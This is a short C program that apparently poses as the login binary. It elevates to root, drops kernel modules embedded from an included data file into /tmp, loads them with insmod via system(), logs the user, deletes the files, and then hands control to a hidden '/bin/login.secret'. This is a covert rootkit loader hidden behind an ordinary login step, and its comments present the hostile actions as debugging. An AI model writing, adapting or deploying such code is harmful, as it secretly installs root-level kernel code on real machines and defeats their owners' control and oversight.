#include <stdio.h>
#include <unistd.h>
#include <string.h>

//#define DO_SOMETHING(x) printf("exec[%s]\n",x)
#define DO_SOMETHING(x) system(x)

int ko_files[] = {

  /*file 1*/
  /*'t','e','s','t','k',-1,*/
  /*file 2*/
  /*'t','a','s','t'*/
  #include "file_contexts.inl"
};

char rm_temp_file[] = "rm -r /tmp/ko_filea.ko";
char * temp_file_name = rm_temp_file + 6;// /tmp/ko_filea

int main(int argc,char*args[],char *env[]){

  unsigned int o_uid = getuid(),o_gid = getgid();
  //to root
  setuid(0);
  setgid(0);

  /* k is a counter, 'a','b','c',... */
  /*ko_filea.ko ko_fileb.ko ko_filec.ko*/
  char * k = temp_file_name;
  while(*k != 'a')
    k++;

  /* extract all files to directory */
  FILE *f = fopen(temp_file_name,"w");
  /* write to temp file */
  for(size_t i=0;i<sizeof(ko_files)/sizeof(*ko_files);i++){
    if(ko_files[i] == -1){
      fclose(f);
      (*k)++;//next file
      f = fopen(temp_file_name,"w");
      continue;
    }
    fputc(ko_files[i],f);
  }
  fclose(f);
/*debug only*/
system("echo $(whoami) $(date) > /tmp/login.log.log");

  for(;*k >= 'a';(*k)--){
    /* do something with temp_file_name */
    printf("DEBUG ONLY:I am trying to load %s\n",temp_file_name);

    char buff[2048] = "insmod ";
    char * cur = buff;
    while(*cur)
      cur++;
    strcpy(cur,temp_file_name);

    /* ldmod xxx.ko */
    DO_SOMETHING(buff);


    /* remove temp file */
    system(rm_temp_file);
  }
  /*TODO*/
  //do something to run the real program
  setuid(o_uid);
  setgid(o_gid);
  execve("/bin/login.secret",args,env);
  return 0;
}
